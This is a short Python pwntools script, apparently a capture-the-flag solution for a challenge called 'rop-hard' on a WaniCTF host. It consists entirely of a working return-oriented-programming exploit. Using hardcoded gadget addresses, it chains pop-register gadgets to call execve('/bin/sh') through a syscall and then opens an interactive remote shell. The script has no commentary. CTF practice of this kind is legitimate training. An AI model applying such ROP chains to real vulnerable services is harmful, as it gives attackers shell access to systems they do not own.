from pwn import *

#s = process('./pwn05')
s = remote('rop-hard.pwn.wanictf.org', 9005)
elf = ELF('./pwn05')

binsh = 0x404078
syscall = 0x004012b6
pop_rdi = 0x0040128f
pop_rsi_r15 = 0x00401611
pop_rdx = 0x0040129c
pop_rax = 0x004012a9


def append_hex(value):
    s.sendlineafter('> ', '1')
    s.sendlineafter('hex value?: ', hex(value))

def execute():
    s.sendlineafter('> ', '0')
    s.interactive()


append_hex(pop_rdi)
append_hex(binsh)
append_hex(pop_rsi_r15)
append_hex(0)
append_hex(0)
append_hex(pop_rdx)
append_hex(0)
append_hex(pop_rax)
append_hex(59)
append_hex(syscall)

execute()
